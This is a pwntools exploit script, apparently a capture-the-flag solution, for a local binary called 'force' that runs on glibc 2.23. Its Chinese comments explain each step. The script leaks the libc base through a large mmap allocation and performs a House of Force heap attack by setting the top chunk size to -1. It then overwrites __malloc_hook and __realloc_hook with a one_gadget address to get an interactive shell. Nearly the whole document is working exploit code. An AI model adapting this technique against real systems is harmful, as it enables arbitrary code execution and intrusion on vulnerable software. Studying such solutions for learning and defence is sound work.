#coding:utf8
from pwn import *

sh = process('./force')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
realloc_s = libc.sym['realloc']
malloc_hook_s = libc.symbols['__malloc_hook']
one_gadget = 0x4526a

def create(size,content):
   sh.sendlineafter('2:puts','1')
   sh.sendlineafter('size',str(size))
   sh.recvuntil('bin addr ')
   addr = int(sh.recvuntil('\n',drop = True),16)
   sh.sendafter('content',content)
   return addr

#通过mmap一个堆，我们得到了mmap的堆的地址，就能计算出libc地址
#因为mmap的这个堆靠近libc的地址
libc_base = create(0x200000,'a') + 0x200FF0
realloc_addr = libc_base + realloc_s
malloc_hook_addr = libc_base + malloc_hook_s
one_gadget_addr = libc_base + one_gadget
print 'libc_base=',hex(libc_base)
print 'malloc_hook_addr=',hex(malloc_hook_addr)
print 'one_gadget_addr=',hex(one_gadget_addr)
#house of force
#修改top chunk的size为-1，即超级大
heap_addr = create(0x10,'\x00'*0x18 + p64(0xFFFFFFFFFFFFFFFF)) - 0x10
print 'heap_addr=',hex(heap_addr)

top_chunk_addr = heap_addr + 0x20
print 'top_chunk_addr=',hex(top_chunk_addr)
#分配偏移大小的chunk，将top chunk移到了malloc_hook_addr - 0x20处
offset = malloc_hook_addr - top_chunk_addr - 0x30
create(offset,'c')
#分配到relloc_hook处，写同时realloc_hook和malloc_hook
create(0x10,p64(0) + p64(one_gadget_addr) + p64(realloc_addr + 4))
#getshell
sh.sendlineafter('2:puts','1')
sh.sendlineafter('size','1')


sh.interactive()
